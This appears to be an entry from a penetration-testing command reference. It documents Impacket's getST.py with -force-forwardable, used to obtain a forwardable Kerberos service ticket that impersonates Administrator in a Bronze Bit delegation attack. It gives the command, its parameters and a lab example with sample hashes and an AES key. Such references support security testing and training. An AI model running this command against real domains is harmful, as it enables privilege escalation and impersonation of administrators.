---
type: command
executor: python
data: >-
  getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes
  aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey
  4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4
  test.local/Service1$ -force-forwardable -dc-ip <DC_IP>
tags:
  - kerberos
  - ticket
  - impacket
platforms:
  - Linux
  - Windows
verified: true
validated: true
---

# python-getst-py-request-forwardable-ticket

## Command

```python
getST.py -spn $_SPN -impersonate $_USER -hashes $_LM_HASH:$_NTLM_HASH -aesKey $_AES_KEY $_DOMAIN/$_MACHINE -force-forwardable -dc-ip $_DC_IP
```

## Description

Requests a Kerberos service ticket with the forwardable flag using Impacket, exploiting weak bit protection for delegation abuse.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -spn $_SPN | Target service principal (e.g., cifs/Service2.test.local) | Yes |
| -impersonate $_USER | User to impersonate | Yes |
| -hashes $_HASHES | LM:NTLM hashes | Yes |
| -aesKey $_AES_KEY | AES key for encryption | Yes |
| $_DOMAIN/$_MACHINE | Domain and machine account | Yes |
| -force-forwardable | Forces forwardable flag | Yes |
| -dc-ip $_DC_IP | Domain controller IP | Yes |

## Examples

### Basic Usage

```python
getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes :7c1673f58e7794c77dead3174b58b68f test.local/Service1$ -force-forwardable -dc-ip 192.168.1.10
```

## Expected Output

Generates a .ccache file (e.g., Administrator.ccache) with the forwardable ticket.

## Related

- [[procedures/Kerberos-Bronze-Bit-Attack]]
- [[commands/python-getst-py-bronze-bit-execution]]
